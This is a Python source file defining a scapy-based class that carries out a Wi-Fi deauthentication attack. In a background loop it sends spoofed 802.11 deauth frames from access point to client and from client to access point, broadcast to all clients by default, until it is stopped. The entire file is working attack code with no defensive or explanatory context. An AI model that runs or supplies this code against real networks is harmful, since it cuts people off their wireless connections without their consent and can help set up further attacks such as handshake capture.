import threading
import time

from scapy.all import Dot11, Dot11Deauth, RadioTap, conf, sendp


class DeauthAttack:
    def __init__(self) -> None:
        self._running = False
        self._thread: threading.Thread | None = None

    @property
    def running(self) -> bool:
        return self._running

    def start(self, iface: str, ap_mac: str, client_mac: str = "ff:ff:ff:ff:ff:ff") -> None:
        conf.verb = 0
        self._running = True
        self._thread = threading.Thread(
            target=self._loop, args=(iface, ap_mac, client_mac), daemon=True,
        )
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._thread:
            self._thread.join(timeout=2)

    def _loop(self, iface: str, ap_mac: str, client_mac: str) -> None:
        while self._running:
            # Deauth from AP → client
            sendp(
                RadioTap()
                / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
                / Dot11Deauth(reason=7),
                iface=iface, count=1, verbose=False,
            )
            # Deauth from client → AP (makes AP also evict the client)
            sendp(
                RadioTap()
                / Dot11(addr1=ap_mac, addr2=client_mac, addr3=ap_mac)
                / Dot11Deauth(reason=7),
                iface=iface, count=1, verbose=False,
            )
            time.sleep(0.1)
